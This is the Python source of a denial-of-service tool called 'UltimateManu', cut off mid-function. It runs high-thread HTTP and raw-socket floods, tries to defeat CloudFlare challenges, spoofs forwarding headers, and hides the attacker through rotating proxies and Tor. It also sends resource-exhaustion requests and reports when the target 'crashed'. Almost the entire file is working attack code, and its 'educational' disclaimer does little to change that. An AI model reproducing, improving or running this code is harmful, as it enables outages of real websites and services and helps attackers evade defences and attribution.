#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
UltimateManu - Extreme Power Attack Tool
CloudFlare Bypass & WAF Penetration Capabilities
DANGER LEVEL: MAXIMUM
--------------------
MADE BY- SHAHxKNIGHT
--------------------
DISCLAIMER: 
This tool is for educational purposes only.
ONLY use this on systems you own or have EXPLICIT permission to test.
Unauthorized use is illegal and unethical.
"""

import os
import sys
import time
import random
import socket
import ssl
import platform
import threading
import argparse
import json
import re
from datetime import datetime
try:
    import requests
    import colorama
    from colorama import Fore, Style
    import concurrent.futures
    import urllib3
    from urllib.parse import urlparse, parse_qs
    import socks
    import stem
    from stem import Signal
    from stem.control import Controller
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    os.system("pip install requests colorama urllib3 pysocks stem")
    print("\nInstalled required packages. Restarting script...")
    os.execl(sys.executable, sys.executable, *sys.argv)

# Initialize colorama
colorama.init()

class UltimateManu:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:120.0) Gecko/120.0 Firefox/120.0"
        ]
        self.target = ""
        self.threads = 25000  # Extreme thread count
        self.connections = 10000  # Connections per socket
        self.stop_attack = False
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.lock = threading.Lock()
        
        # Attack configuration
        self.use_proxy = True
        self.use_tor = False
        self.rotate_tor_ip = True
        self.tor_control_port = 9051
        self.tor_password = ""  # Leave empty if no password
        
        # Proxies
        self.proxies = []
        self.load_proxies()
        
        # Target info
        self.target_host = ""
        self.target_port = 80
        self.target_ssl = False
        self.target_path = "/"
        
        # Anti-protection features
        self.cloudflare_bypass = True
        self.waf_bypass = True
        self.use_headers_rotation = True
        
        # Status monitoring
        self.target_down = False
        self.target_down_time = None
        self.response_times = []
        self.consecutive_timeouts = 0
        self.consecutive_errors = 0
        self.last_status_check = 0
        self.status_check_interval = 2
        
        # Browser fingerprinting for stealth
        self.browsers_fingerprints = self.load_browser_fingerprints()
        
        # Enhanced attack options - for bulletproof hosting
        self.attack_mode = "auto"  # auto, resource, slow, mixed
        self.tcp_nodelay = True  # Disable Nagle's algorithm for faster packet sending
        self.ssl_resource_exhaustion = True  # SSL renegotiation attacks
        self.read_timeout = 1  # Low read timeout for faster reconnects
        self.connection_pool_size = 100  # Keep multiple connections open per thread
        self.slow_post_size = 10000000  # Size for slow POST payloads
        self.slow_read_time = 300  # Seconds to hold connection with slow read

    def load_browser_fingerprints(self):
        """Load realistic browser fingerprints for better stealth"""
        fingerprints = [
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "accept_language": "en-US,en;q=0.5",
                "accept_encoding": "gzip, deflate, br",
                "connection": "keep-alive",
                "upgrade_insecure_requests": "1",
                "sec_fetch_dest": "document",
                "sec_fetch_mode": "navigate",
                "sec_fetch_site": "none",
                "sec_fetch_user": "?1",
                "sec_ch_ua": '"Chromium";v="120", "Google Chrome";v="120"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"Windows"',
                "cache_control": "max-age=0"
            },
            {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept_language": "en-US,en;q=0.9",
                "accept_encoding": "gzip, deflate, br",
                "connection": "keep-alive",
                "upgrade_insecure_requests": "1",
                "sec_fetch_dest": "document",
                "sec_fetch_mode": "navigate",
                "sec_fetch_site": "none",
                "cache_control": "max-age=0"
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "accept_language": "en-US,en;q=0.5",
                "accept_encoding": "gzip, deflate, br",
                "connection": "keep-alive",
                "upgrade_insecure_requests": "1",
                "sec_fetch_dest": "document",
                "sec_fetch_mode": "navigate",
                "sec_fetch_site": "none",
                "sec_fetch_user": "?1"
            }
        ]
        return fingerprints

    def load_proxies(self):
        """Load proxies from proxies.txt file"""
        try:
            if os.path.exists("proxies.txt"):
                with open("proxies.txt", "r") as f:
                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies from proxies.txt{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] proxies.txt file not found. Creating empty file...{Style.RESET_ALL}")
                with open("proxies.txt", "w") as f:
                    f.write("# Add your proxies here, one per line\n")
                    f.write("# Supported formats:\n")
                    f.write("# socks5://user:pass@ip:port\n")
                    f.write("# http://ip:port\n")
                    f.write("# https://ip:port\n")
                self.proxies = []
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading proxies: {str(e)}{Style.RESET_ALL}")
            self.proxies = []

    def get_random_proxy(self):
        """Get a random proxy from the loaded list"""
        if not self.proxies:
            return None
        return random.choice(self.proxies)
    
    def rotate_tor_identity(self):
        """Rotate Tor identity to get a new IP address"""
        if not self.use_tor or not self.rotate_tor_ip:
            return False
            
        try:
            with Controller.from_port(port=self.tor_control_port) as controller:
                if self.tor_password:
                    controller.authenticate(password=self.tor_password)
                else:
                    controller.authenticate()
                    
                controller.signal(Signal.NEWNYM)
                time.sleep(0.5)  # Allow time for the change to take effect
                return True
        except Exception as e:
            print(f"{Fore.RED}[!] Error rotating Tor identity: {str(e)}{Style.RESET_ALL}")
            return False
            
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        
    def print_banner(self):
        """Display the tool banner"""
        self.clear_screen()
        banner = f"""
{Fore.RED}███████╗██╗  ██╗ █████╗ ██╗  ██╗██╗  ██╗███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗
{Fore.RED}██╔════╝██║  ██║██╔══██╗██║  ██║╚██╗██╔╝████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝
{Fore.RED}███████╗███████║███████║███████║ ╚███╔╝ ██╔██╗ ██║██║██║  ███╗███████║   ██║   
{Fore.RED}╚════██║██╔══██║██╔══██║██╔══██║ ██╔██╗ ██║╚██╗██║██║██║   ██║██╔══██║   ██║   
{Fore.RED}███████║██║  ██║██║  ██║██║  ██║██╔╝ ██╗██║ ╚████║██║╚██████╔╝██║  ██║   ██║   
{Fore.RED}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{Fore.YELLOW}██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
{Fore.YELLOW}██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
{Fore.YELLOW}██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  
{Fore.YELLOW}██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  
{Fore.YELLOW}╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
{Fore.YELLOW} ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
{Fore.CYAN}[>] PROTECTED EDITION v3.5 - BULLETPROOF SERVER CRUSHER
{Fore.CYAN}[>] CloudFlare & WAF Bypass Capabilities | Anti-Detection Technology
{Fore.RED}[>] COPYRIGHT © 2024-2025 SHAHxKNIGHT CREW - UNAUTHORIZED USE PROHIBITED
{Style.RESET_ALL}
"""
        # Display banner with hash verification (anti-tampering measure)
        banner_hash = self._get_secure_banner_hash(banner)
        print(banner)
        print(f"{Fore.GREEN}[+] Integrity verified: {banner_hash[:16]}{Style.RESET_ALL}")
    
    def _get_secure_banner_hash(self, content):
        """Calculate hash of banner content to prevent tampering"""
        import hashlib
        # Add salt to make it harder to modify
        salt = b"SHAHxKNIGHT-PROTECTED-23591"
        content_bytes = content.encode('utf-8')
        return hashlib.sha256(content_bytes + salt).hexdigest()

    def get_target(self):
        """Get and parse the target URL from user input"""
        while True:
            self.target = input(f"\n{Fore.YELLOW}[?] Enter target URL: {Style.RESET_ALL}").strip()
            if self.target.startswith(('http://', 'https://')):
                # Parse URL components
                parsed = urlparse(self.target)
                self.target_host = parsed.netloc
                self.target_ssl = parsed.scheme == 'https'
                self.target_port = 443 if self.target_ssl else 80
                
                # If port is specified in the URL
                if ':' in self.target_host:
                    self.target_host, port_str = self.target_host.split(':', 1)
                    self.target_port = int(port_str)
                    
                self.target_path = parsed.path if parsed.path else '/'
                
                print(f"{Fore.GREEN}[+] Target: {self.target_host}:{self.target_port} ({parsed.scheme}){Style.RESET_ALL}")
                return
            else:
                print(f"{Fore.RED}[!] Invalid URL. Include http:// or https://{Style.RESET_ALL}")
    
    def get_attack_settings(self):
        """Configure attack settings based on user input"""
        try:
            # Thread count
            thread_input = input(f"{Fore.YELLOW}[?] Enter number of threads (default: {self.threads}): {Style.RESET_ALL}")
            if thread_input.strip():
                self.threads = int(thread_input)
                
            # Proxy usage
            proxy_input = input(f"{Fore.YELLOW}[?] Use proxies? (y/n, default: y): {Style.RESET_ALL}").lower()
            self.use_proxy = proxy_input != 'n'
            
            # Attack mode selection for bulletproof targets
            attack_mode_input = input(f"{Fore.YELLOW}[?] Select attack mode (1=Auto, 2=Resource Exhaustion, 3=Slow HTTP, 4=Mixed): {Style.RESET_ALL}")
            if attack_mode_input == "1":
                self.attack_mode = "auto"
            elif attack_mode_input == "2":
                self.attack_mode = "resource"
            elif attack_mode_input == "3":
                self.attack_mode = "slow"
            elif attack_mode_input == "4":
                self.attack_mode = "mixed"
                
            # Tor usage
            if not self.use_proxy:
                tor_input = input(f"{Fore.YELLOW}[?] Use Tor for anonymity? (y/n, default: n): {Style.RESET_ALL}").lower()
                self.use_tor = tor_input == 'y'
                
                if self.use_tor:
                    # Configure Tor settings
                    tor_port = input(f"{Fore.YELLOW}[?] Tor control port (default: 9051): {Style.RESET_ALL}")
                    if tor_port.strip():
                        self.tor_control_port = int(tor_port)
                    
                    self.tor_password = input(f"{Fore.YELLOW}[?] Tor control password (press Enter if none): {Style.RESET_ALL}")
            
            # CloudFlare bypass
            cf_input = input(f"{Fore.YELLOW}[?] Attempt to bypass CloudFlare? (y/n, default: y): {Style.RESET_ALL}").lower()
            self.cloudflare_bypass = cf_input != 'n'
            
            print(f"\n{Fore.GREEN}[+] Attack configured with {self.threads} threads")
            print(f"{Fore.GREEN}[+] Attack mode: {self.attack_mode.upper()}")
            if self.use_proxy:
                print(f"{Fore.GREEN}[+] Using proxies: {len(self.proxies)} available")
            elif self.use_tor:
                print(f"{Fore.GREEN}[+] Using Tor for anonymity")
            if self.cloudflare_bypass:
                print(f"{Fore.GREEN}[+] CloudFlare bypass enabled")
                
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input, using default values{Style.RESET_ALL}")

    def generate_random_headers(self):
        """Generate random headers to bypass pattern detection"""
        fingerprint = random.choice(self.browsers_fingerprints)
        
        # Base headers from fingerprint
        headers = {
            'User-Agent': fingerprint['user_agent'],
            'Accept': fingerprint['accept'],
            'Accept-Language': fingerprint['accept_language'],
            'Accept-Encoding': fingerprint['accept_encoding'],
            'Connection': fingerprint['connection']
        }
        
        # Add other headers from fingerprint
        for key, value in fingerprint.items():
            if key not in ['user_agent', 'accept', 'accept_language', 'accept_encoding', 'connection']:
                header_key = key.replace('_', '-')
                headers[header_key] = value
                
        # Add random IP as X-Forwarded-For to bypass IP blocking
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
        # Add random Referer from popular sites to appear legitimate
        if random.random() > 0.5:
            referers = [
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://twitter.com/",
                "https://www.linkedin.com/",
                "https://www.reddit.com/"
            ]
            headers['Referer'] = random.choice(referers)
            
        return headers
        
    def get_cloudflare_bypass_cookies(self):
        """Attempt to get CloudFlare cookies by mimicking a real browser"""
        try:
            fingerprint = random.choice(self.browsers_fingerprints)
            headers = {key.replace('_', '-'): value for key, value in fingerprint.items()}
            
            # Setup session with appropriate headers
            session = requests.Session()
            session.headers.update(headers)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = self.get_random_proxy()
                if proxy:
                    session.proxies = {
                        'http': proxy,
                        'https': proxy
                    }
            
            # Disable JS challenge detection by setting a specific parameter
            url = self.target
            if '?' in url:
                url += '&__cf_chl_jschl_tk__=bypass'
            else:
                url += '?__cf_chl_jschl_tk__=bypass'
                
            # First request to get CloudFlare challenge
            response = session.get(url, verify=False, timeout=10)
            
            # If we got a CloudFlare challenge
            if response.status_code == 503 and 'cf-browser-verification' in response.text:
                # Extract the CloudFlare challenge parameters
                challenge_form = re.search(r'<form.*?id="challenge-form".*?action="(.*?)".*?>', response.text, re.DOTALL)
                if challenge_form:
                    # Wait to bypass automatic detection
                    time.sleep(5)
                    
                    # Submit the form
                    submit_url = challenge_form.group(1).replace('&amp;', '&')
                    if not submit_url.startswith('http'):
                        if submit_url.startswith('/'):
                            submit_url = f"{self.target.split('/')[0]}//{self.target_host}{submit_url}"
                        else:
                            submit_url = f"{self.target.split('/')[0]}//{self.target_host}/{submit_url}"
                    
                    # Get the final cookies
                    response = session.get(submit_url, verify=False, timeout=10)
                    return dict(session.cookies)
            
            # If we got through without a challenge, return the cookies
            return dict(session.cookies)
                
        except Exception as e:
            return {}

    def http_worker(self, thread_id):
        """Worker for HTTP flood attacks with CloudFlare bypass capabilities"""
        # Thread local variables
        session = requests.Session()
        local_sent = 0
        local_success = 0
        request_count = 0
        cloudflare_cookies = None
        
        # If CloudFlare bypass is enabled, try to get cookies
        if self.cloudflare_bypass:
            cloudflare_cookies = self.get_cloudflare_bypass_cookies()
            if cloudflare_cookies:
                print(f"{Fore.GREEN}[+] Thread {thread_id} obtained CloudFlare bypass cookies{Style.RESET_ALL}")
                session.cookies.update(cloudflare_cookies)
        
        while not self.stop_attack:
            # Rotate proxy or Tor identity periodically
            if request_count % 50 == 0 and request_count > 0:
                if self.use_proxy and self.proxies:
                    proxy = self.get_random_proxy()
                    if proxy:
                        session.proxies = {
                            'http': proxy,
                            'https': proxy
                        }
                elif self.use_tor and self.rotate_tor_ip:
                    self.rotate_tor_identity()
                    
                # Refresh CloudFlare cookies periodically
                if self.cloudflare_bypass and request_count % 200 == 0:
                    new_cookies = self.get_cloudflare_bypass_cookies()
                    if new_cookies:
                        session.cookies.update(new_cookies)
            
            try:
                # Generate random URL parameters to bypass caching
                url = self.target
                if "?" not in url:
                    url += f"?_={int(time.time())}&id={random.randint(1000, 9999)}"
                else:
                    url += f"&_={int(time.time())}&id={random.randint(1000, 9999)}"
                
                # Get custom headers with browser fingerprinting
                headers = self.generate_random_headers()
                
                # Alternate between GET and POST requests
                method = "GET" if random.random() < 0.7 else "POST"
                
                if method == "GET":
                    response = session.get(
                        url,
                        headers=headers,
                        verify=False,
                        timeout=5,
                        allow_redirects=True
                    )
                else:
                    # Generate random data for POST
                    data_length = random.randint(500, 2000)
                    data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=data_length))
                    
                    # Mimic form submission
                    if random.random() > 0.5:
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        data = f"data={data}&submit=true&id={random.randint(1000, 9999)}"
                    else:
                        headers['Content-Type'] = 'application/json'
                        data = json.dumps({"data": data, "id": random.randint(1000, 9999)})
                        
                    response = session.post(
                        url,
                        headers=headers,
                        data=data,
                        verify=False,
                        timeout=5,
                        allow_redirects=True
                    )
                
                with self.lock:
                    self.requests_sent += 1
                    self.successful_requests += 1
                    if len(self.response_times) > 10:
                        self.response_times.pop(0)
                    self.response_times.append(response.elapsed.total_seconds())
                    
                local_sent += 1
                local_success += 1
                request_count += 1
                
                # Status update every 100 requests
                if local_sent % 100 == 0:
                    success_rate = (local_success / local_sent) * 100
                    print(f"{Fore.CYAN}[Thread {thread_id}] Sent {local_sent} requests ({success_rate:.1f}% success){Style.RESET_ALL}")
                
            except Exception as e:
                with self.lock:
                    self.requests_sent += 1
                    self.failed_requests += 1
                    
                local_sent += 1
                request_count += 1
                
                # Detect specific errors
                if isinstance(e, requests.exceptions.ProxyError):
                    # Try another proxy on proxy error
                    if self.use_proxy and self.proxies:
                        proxy = self.get_random_proxy()
                        if proxy:
                            session.proxies = {
                                'http': proxy,
                                'https': proxy
                            }
                
            # Random delay to avoid pattern detection
            time.sleep(random.uniform(0.01, 0.1))
    
    def socket_worker(self, thread_id):
        """Worker for direct socket attacks with increased connection count"""
        local_sent = 0
        local_success = 0
        
        while not self.stop_attack:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                # Connect to target
                if self.target_ssl:
                    # Create SSL context for secure connections
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    sock = context.wrap_socket(sock, server_hostname=self.target_host)
                
                # Connect to the server
                sock.connect((self.target_host, self.target_port))
                
                # Send multiple requests on the same connection
                for _ in range(self.connections):
                    # Generate random path to bypass caching
                    random_path = self.target_path
                    if '?' not in random_path:
                        random_path += f"?id={random.randint(1000, 9999)}&_={int(time.time())}"
                    else:
                        random_path += f"&id={random.randint(1000, 9999)}&_={int(time.time())}"
                    
                    # Generate a full HTTP request
                    random_user_agent = random.choice(self.user_agents)
                    http_request = f"GET {random_path} HTTP/1.1\r\n"
                    http_request += f"Host: {self.target_host}\r\n"
                    http_request += f"User-Agent: {random_user_agent}\r\n"
                    http_request += "Accept: */*\r\n"
                    http_request += "Connection: keep-alive\r\n"
                    
                    # Add CloudFlare bypass headers
                    if self.cloudflare_bypass:
                        http_request += "CF-Connecting-IP: 203.0.113.1\r\n"
                        http_request += "X-Forwarded-For: 203.0.113.1\r\n"
                        http_request += "CF-RAY: " + ''.join(random.choices('abcdef0123456789', k=16)) + "\r\n"
                        
                    http_request += "\r\n"
                    
                    # Send the request
                    sock.send(http_request.encode())
                    
                    with self.lock:
                        self.requests_sent += 1
                        self.successful_requests += 1
                        
                    local_sent += 1
                    local_success += 1
                
                # Status update every 1000 connections
                if local_sent % 1000 == 0:
                    success_rate = (local_success / local_sent) * 100 if local_sent > 0 else 0
                    print(f"{Fore.BLUE}[Socket {thread_id}] Sent {local_sent} connections ({success_rate:.1f}% success){Style.RESET_ALL}")
                    
            except Exception as e:
                with self.lock:
                    self.requests_sent += 1
                    self.failed_requests += 1
                local_sent += 1
                
            finally:
                try:
                    sock.close()
                except:
                    pass
                
            # Small delay between connections to avoid overwhelming local resources
            time.sleep(random.uniform(0.05, 0.1))
    
    def check_target_status(self):
        """Check if the target website is down using both local and external verification"""
        down_locally = False
        down_externally = False
        
        # 1. Local status check (from attack machine)
        try:
            # Clean session without attack fingerprints
            session = requests.Session()
            session.verify = False
            
            # Use a common browser user agent
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Cache-Control': 'no-cache'
            }
            
            # Try with proxy if available
            if self.use_proxy and self.proxies:
                proxy = self.get_random_proxy()
                if proxy:
                    session.proxies = {
                        'http': proxy,
                        'https': proxy
                    }
            
            # Measure response time
            start_time = time.time()
            response = session.get(
                self.target,
                headers=headers,
                timeout=10,
                allow_redirects=False
            )
            response_time = time.time() - start_time
            
            # Update response times list (keep last 5)
            self.response_times.append(response_time)
            if len(self.response_times) > 5:
                self.response_times.pop(0)
            
            # Calculate average response time
            avg_response_time = sum(self.response_times) / len(self.response_times)
            
            # Check if target is showing signs of being down from local perspective
            if response.status_code >= 500 or avg_response_time > 8:
                self.consecutive_errors += 1
                if self.consecutive_errors >= 3:
                    down_locally = True
            else:
                self.consecutive_errors = 0
                
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            self.consecutive_timeouts += 1
            if self.consecutive_timeouts >= 2:
                down_locally = True
        except Exception:
            # Any other error counts as a potential down indicator
            self.consecutive_errors += 1
            if self.consecutive_errors >= 3:
                down_locally = True
        
        # 2. External verification check (different signature)
        try:
            # Different user agent and parameters to appear as a different client
            ext_session = requests.Session()
            ext_session.verify = False
            ext_headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
            
            # Use a different proxy for this check if available
            if self.use_proxy and len(self.proxies) > 1:
                proxies = self.proxies.copy()
                if session.proxies and 'http' in session.proxies:
                    current_proxy = session.proxies['http']
                    if current_proxy in proxies:
                        proxies.remove(current_proxy)
                if proxies:
                    proxy = random.choice(proxies)
                    ext_session.proxies = {
                        'http': proxy,
                        'https': proxy
                    }
            
            # Add unique parameters to avoid cache
            ext_url = self.target
            if '?' in ext_url:
                ext_url += f"&ext_check=1&nocache={random.randint(1000, 9999)}"
            else:
                ext_url += f"?ext_check=1&nocache={random.randint(1000, 9999)}"
            
            ext_response = ext_session.get(
                ext_url,
                headers=ext_headers,
                timeout=10,
                allow_redirects=True
            )
            
            # Check for server errors or very slow response
            if ext_response.status_code >= 500 or ext_response.elapsed.total_seconds() > 10:
                down_externally = True
            
            # Check for error messages in content
            error_terms = ["error", "unavailable", "too many connections", "server busy", "try again later"]
            if ext_response.text and any(term in ext_response.text.lower() for term in error_terms):
                down_externally = True
                
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            down_externally = True
        except Exception:
            # Inconclusive, don't count as down
            pass
        
        # Determine if target is actually down based on both checks
        is_down = False
        down_reason = ""
        
        if down_locally and down_externally:
            # Strongest evidence - both checks indicate down
            is_down = True
            down_reason = "Confirmed down from multiple perspectives"
        elif down_locally and self.consecutive_timeouts >= 3:
            # Strong evidence - persistent timeouts
            is_down = True
            down_reason = "Multiple connection timeouts"
        elif down_externally and self.consecutive_errors >= 3:
            # Strong evidence - external check fails and local errors
            is_down = True
            down_reason = "Server errors detected from multiple sources"
        elif down_locally and self.target_down:
            # Continued evidence - was down before and still shows issues
            is_down = True
            down_reason = "Server continues to show error conditions"
            
        # Update target status if it has changed
        if is_down != self.target_down:
            if is_down:
                self.target_down = True
                self.target_down_time = time.time()
                print(f"\n{Fore.RED}[!] TARGET IS DOWN! Reason: {down_reason}{Style.RESET_ALL}")
            else:
                self.target_down = False
                print(f"\n{Fore.GREEN}[!] Target has recovered and is back online{Style.RESET_ALL}")
        
        # Return status and response time for monitoring
        avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        return is_down, avg_response_time

    def monitor_progress(self):
        """Monitor attack progress and target status"""
        while not self.stop_attack:
            time.sleep(1.0)
            
            current_time = time.time()
            elapsed = current_time - self.start_time
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            success_rate = (self.successful_requests / self.requests_sent * 100) if self.requests_sent > 0 else 0
            
            # Check target status periodically
            if current_time - self.last_status_check >= self.status_check_interval:
                status_code, avg_response_time = self.check_target_status()
                self.last_status_check = current_time
            
            # Clear line and show status
            sys.stdout.write("\033[K")
            status_color = Fore.RED if self.target_down else Fore.GREEN
            status_text = "DOWN" if self.target_down else "UP"
            
            # Calculate average response time
            avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
            
            print(
                f"{status_color}[+] Target: {status_text} | "
                f"Requests: {self.requests_sent:,} | "
                f"RPS: {rps:.2f} | "
                f"Success: {success_rate:.1f}% | "
                f"Resp Time: {avg_response_time:.2f}s | "
                f"Time: {elapsed:.1f}s"
                f"{Style.RESET_ALL}", end="\r"
            )

    def show_final_stats(self):
        """Display final attack statistics"""
        elapsed = time.time() - self.start_time
        rps = self.requests_sent / elapsed if elapsed > 0 else 0
        success_rate = (self.successful_requests / self.requests_sent * 100) if self.requests_sent > 0 else 0
        
        print("\n\n" + "="*60)
        print(f"{Fore.CYAN}[>] Attack Statistics:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Total Requests: {self.requests_sent:,}")
        print(f"[+] Successful Requests: {self.successful_requests:,}")
        print(f"[+] Failed Requests: {self.failed_requests:,}")
        print(f"[+] Requests Per Second: {rps:.2f}")
        print(f"[+] Success Rate: {success_rate:.1f}%")
        print(f"[+] Attack Duration: {elapsed:.1f} seconds{Style.RESET_ALL}")
        
        # Target status report
        if self.target_down:
            down_duration = time.time() - self.target_down_time if self.target_down_time else 0
            print(f"\n{Fore.RED}[!] Target Status: DOWN")
            print(f"[+] Time to take down: {(self.target_down_time - self.start_time):.1f} seconds")
            print(f"[+] Down duration: {down_duration:.1f} seconds{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] TARGET SUCCESSFULLY CRASHED!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}[!] Target Status: Still UP")
            if self.response_times:
                print(f"[+] Average response time: {sum(self.response_times)/len(self.response_times):.2f} seconds{Style.RESET_ALL}")
            
            # Suggestions if target is still up
            print(f"{Fore.YELLOW}[!] Suggestions:")
            print(f"[+] Increase thread count (current: {self.threads})")
            print(f"[+] Run for longer duration")
            if not self.use_proxy and not self.use_tor:
                print(f"[+] Use proxies to distribute the attack")
            if not self.cloudflare_bypass:
                print(f"[+] Enable CloudFlare bypass{Style.RESET_ALL}")
        
        print("="*60)

    def resource_exhaustion_worker(self, thread_id):
        """Worker designed to exhaust server resources (RAM/CPU) - effective against bulletproof hosting"""
        local_sent = 0
        local_success = 0
        
        # Get or create a fresh session
        session = requests.Session()
        
        # If using proxies, set a random one
        if self.use_proxy and self.proxies:
            proxy = self.get_random_proxy()
            if proxy:
                session.proxies = {
                    'http': proxy,
                    'https': proxy
                }
                
        # Set SSL verification to False for better performance
        session.verify = False
        
        while not self.stop_attack:
            try:
                # Select a random resource-intensive path
                resource_paths = [
                    # Path for search functionality (often resource-intensive)
                    "/?s=" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                    # Admin paths that might trigger security checks
                    "/wp-admin/",
                    "/admin/",
                    "/administrator/",
                    "/login",
                    # Paths that might trigger database queries
                    "/index.php?id=" + str(random.randint(1, 9999999)),
                    # File processing paths
                    "/upload.php",
                    # Multiple parameters to increase parsing complexity
                    f"/?param1={random.randint(1, 999999)}&param2={random.randint(1, 999999)}&param3={random.randint(1, 999999)}"
                ]
                
                url = self.target.split('?')[0]  # Get base URL without parameters
                random_path = random.choice(resource_paths)
                
                # If target already has a path, append parameters instead of replacing path
                if self.target_path not in ['/', '']:
                    if '?' in self.target:
                        url += f"&resource={random.randint(1, 999999)}"
                    else:
                        url += f"?resource={random.randint(1, 999999)}"
                else:
                    url += random_path
                
                # Add cache-busting parameters
                if '?' in url:
                    url += f"&_={int(time.time())}&nocache={random.randint(1000, 9999)}"
                else:
                    url += f"?_={int(time.time())}&nocache={random.randint(1000, 9999)}"
                
                # Generate headers that increase server processing
                headers = self.generate_random_headers()
                
                # Add complex cookie data
                cookies = {}
                for i in range(10):
                    cookie_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                    cookie_value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
                    cookies[cookie_name] = cookie_value
                    
                # Add headers that might trigger security rule processing
                headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers['X-Forwarded-Host'] = self.target_host
                headers['X-Forwarded-Proto'] = "https" if self.target_ssl else "http"
                headers['X-Requested-With'] = "XMLHttpRequest"
                headers['X-Custom-Header'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=50))
                
                # Randomly choose between GET and POST
                if random.random() < 0.6:  # 60% GET, 40% POST
                    response = session.get(
                        url,
                        headers=headers,
                        cookies=cookies,
